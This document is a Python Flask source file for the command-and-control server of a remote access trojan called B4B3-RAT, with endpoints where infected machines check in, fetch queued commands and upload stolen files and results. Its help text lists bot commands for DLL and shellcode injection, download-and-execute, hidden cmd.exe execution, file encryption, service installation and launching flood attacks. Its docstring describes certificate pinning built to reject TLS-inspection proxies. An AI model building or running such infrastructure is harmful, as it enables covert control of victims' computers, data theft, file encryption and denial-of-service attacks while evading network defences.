"""
B4B3-RAT Custom C2 Server
Replaces the Telegram bot backend with a self-hosted HTTPS endpoint.

Requirements:
    pip install flask

TLS (required — stub uses INTERNET_FLAG_SECURE and pins the cert):
    Generate a self-signed cert. The CN MUST match the hostname you put in the Builder
    (e.g. "c2.redteam.local" or an IP). The stub's cert pinning checks this.

        openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
            -subj "/CN=<your_c2_hostname>"

    Place cert.pem and key.pem alongside this file.
    The stub rejects any cert whose subject doesn't contain the C2 hostname you configured,
    AND rejects any CA-signed cert (including TLS-inspection proxy certs).

Usage:
    C2_AUTH=mysecret C2_PORT=443 python c2_server.py

Operator commands (interactive prompt):
    list               — show connected bots
    info  <id>         — show check-in info for a bot
    cmd   <id> <cmd>   — queue a command for a bot
    results <id>       — print and clear pending results for a bot
    quit               — stop the server
"""

import os
import sys
import threading
from datetime import datetime

try:
    from flask import Flask, request
except ImportError:
    sys.exit("Flask not found. Run: pip install flask")

AUTH_KEY = os.environ.get("C2_AUTH", "changeme")
PORT     = int(os.environ.get("C2_PORT", 443))

app  = Flask(__name__)
lock = threading.Lock()
# bots: { str(bot_id): { info, last_seen, pending_cmd, results: [] } }
bots = {}

# ── Auth helper ──────────────────────────────────────────────────────────────

def _authed():
    return request.args.get("auth") == AUTH_KEY

# ── Endpoints ────────────────────────────────────────────────────────────────

@app.route("/ping")
def ping():
    if not _authed():
        return "Unauthorized", 403
    return "OK", 200


@app.route("/checkin")
def checkin():
    if not _authed():
        return "", 403
    bot_id = request.args.get("id")
    info   = request.args.get("info", "")
    if not bot_id:
        return "", 400
    with lock:
        if bot_id not in bots:
            bots[bot_id] = {
                "info":        info,
                "last_seen":   datetime.now().isoformat(),
                "pending_cmd": "",
                "results":     [],
            }
            print(f"\n[+] New bot: {bot_id}")
        else:
            bots[bot_id]["info"]      = info
            bots[bot_id]["last_seen"] = datetime.now().isoformat()
    return "", 200


@app.route("/cmd")
def cmd():
    if not _authed():
        return "", 403
    bot_id = request.args.get("id")
    if not bot_id:
        return "", 400
    with lock:
        if bot_id not in bots:
            return "", 200
        command = bots[bot_id].get("pending_cmd", "")
        bots[bot_id]["pending_cmd"] = ""          # consume on first read
        bots[bot_id]["last_seen"]   = datetime.now().isoformat()
    return command, 200


@app.route("/upload", methods=["POST"])
def upload():
    if not _authed():
        return "", 403
    bot_id = request.args.get("id")
    if not bot_id:
        return "", 400
    if "file" not in request.files:
        return "no file", 400

    f = request.files["file"]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = os.path.splitext(f.filename)[1] if f.filename else ".bin"
    saved_name = f"{bot_id}_{timestamp}{ext}"

    os.makedirs("uploads", exist_ok=True)
    f.save(os.path.join("uploads", saved_name))

    with lock:
        if bot_id in bots:
            bots[bot_id]["last_seen"] = datetime.now().isoformat()
            bots[bot_id].setdefault("files", []).append(saved_name)

    print(f"\n[upload:{bot_id}] Saved: uploads/{saved_name}")
    return saved_name, 200


@app.route("/result")
def result():
    if not _authed():
        return "", 403
    bot_id = request.args.get("id")
    data   = request.args.get("data", "")
    if not bot_id:
        return "", 400
    with lock:
        if bot_id in bots:
            bots[bot_id]["results"].append({
                "time": datetime.now().isoformat(),
                "data": data,
            })
            bots[bot_id]["last_seen"] = datetime.now().isoformat()
    print(f"\n[result:{bot_id}] {data[:120]}")
    return "", 200

# ── Operator CLI ─────────────────────────────────────────────────────────────

HELP = """
Commands:
  list               list connected bots
  info  <id>         show check-in info for bot
  cmd   <id> <cmd>   queue a command  (e.g. cmd 12345 processes)
  results <id>       print and clear results for bot
  files   <id>       list uploaded files for bot (screenshots etc.)
  quit               stop the server

Bot command reference:
  processes                          list running processes
  closeproc <name.exe>               kill a process
  inject_dll <proc.exe> <C:\\.dll>   inject DLL
  inject_shell <proc.exe> <sc>       inject shellcode
  loader <url> <dest_path>           download file
  run <path> [args]                  execute file
  dir show <C:\\Folder>              list directory
  dir read <C:\\file.txt>            read file
  dir write <C:\\file.txt> <text>    write file
  dir del_file <C:\\file.exe>        delete file
  service show                       list device drivers
  service add <n> <dn> <path> <type> <start>
  service delete/start/stop <name>
  screenshot                         capture screen → prntscr URL
  filecrypt <path> <key>             AES-encrypt a file
  filedecrypt <path> <key>           AES-decrypt a file
  system <cmd args>                  run via cmd.exe (blind)
  botnet start <url>                 start flood thread
  botnet stop                        stop flood thread
  disable pc | disable display | close
"""

def operator_cli():
    print("=== B4B3-RAT C2 Server ===")
    print(f"Auth key : {AUTH_KEY}")
    print(f"Port     : {PORT}")
    print("Type 'help' for command list.\n")

    while True:
        try:
            line = input("c2> ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if not line:
            continue

        parts = line.split(" ", 2)
        verb  = parts[0].lower()

        if verb == "help":
            print(HELP)

        elif verb == "quit":
            os._exit(0)

        elif verb == "list":
            with lock:
                if not bots:
                    print("  (no bots)")
                for bid, b in bots.items():
                    pending = "[cmd pending]" if b["pending_cmd"] else ""
                    print(f"  {bid}  last={b['last_seen']}  {pending}")

        elif verb == "info" and len(parts) >= 2:
            bid = parts[1]
            with lock:
                if bid in bots:
                    print(bots[bid]["info"].replace("%0A", "\n"))
                else:
                    print("  Bot not found.")

        elif verb == "cmd" and len(parts) >= 3:
            bid, command = parts[1], parts[2]
            with lock:
                if bid in bots:
                    bots[bid]["pending_cmd"] = command
                    print(f"  Queued for {bid}: {command}")
                else:
                    print("  Bot not found.")

        elif verb == "files" and len(parts) >= 2:
            bid = parts[1]
            with lock:
                if bid in bots:
                    uploads = bots[bid].get("files", [])
                    if not uploads:
                        print("  (no uploaded files)")
                    for name in uploads:
                        print(f"  uploads/{name}")
                else:
                    print("  Bot not found.")

        elif verb == "results" and len(parts) >= 2:
            bid = parts[1]
            with lock:
                if bid in bots:
                    results = bots[bid]["results"]
                    if not results:
                        print("  (no results)")
                    for r in results:
                        print(f"  [{r['time']}]\n{r['data'].replace('%0A', chr(10))}\n")
                    bots[bid]["results"] = []
                else:
                    print("  Bot not found.")

        else:
            print("  Unknown command. Type 'help'.")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    cli_thread = threading.Thread(target=operator_cli, daemon=True)
    cli_thread.start()

    ssl_ctx = None
    if os.path.exists("cert.pem") and os.path.exists("key.pem"):
        ssl_ctx = ("cert.pem", "key.pem")
        print("[*] TLS enabled (cert.pem / key.pem)")
    else:
        print("[!] cert.pem / key.pem not found — running HTTP only.")
        print("    The stub uses INTERNET_FLAG_SECURE so it WILL fail without TLS.")
        print("    Generate: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n")

    # Suppress Flask request logs so they don't clobber the CLI prompt
    import logging
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)

    app.run(host="0.0.0.0", port=PORT, ssl_context=ssl_ctx, use_reloader=False)
